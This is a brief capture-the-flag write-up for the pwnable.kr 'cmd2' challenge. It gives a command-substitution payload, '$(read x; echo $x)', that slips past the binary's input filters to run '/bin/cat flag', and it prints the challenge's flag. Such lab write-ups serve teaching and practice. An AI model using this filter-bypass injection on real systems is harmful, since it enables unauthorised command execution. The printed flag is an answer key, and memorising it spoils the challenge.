# Source

Daddy bought me a system command shell.
but he put some filters to prevent me from playing with it without his permission...
but I wanna play anytime I want!

ssh cmd2@pwnable.kr -p2222 (pw:flag of cmd1)

[code](./cmd2.c)

# 🚩Solve

Payload:

- W1: __./cmd2 '$(read x; echo $x)'__

```bash
cmd2@pwnable:~$ ./cmd2 '$(read x; echo $x)'
$(read x; echo $x)
/bin/cat flag
FuN_w1th_5h3ll_v4riabl3s_haha
cmd2@pwnable:~$
```

Flag: ___FuN_w1th_5h3ll_v4riabl3s_haha___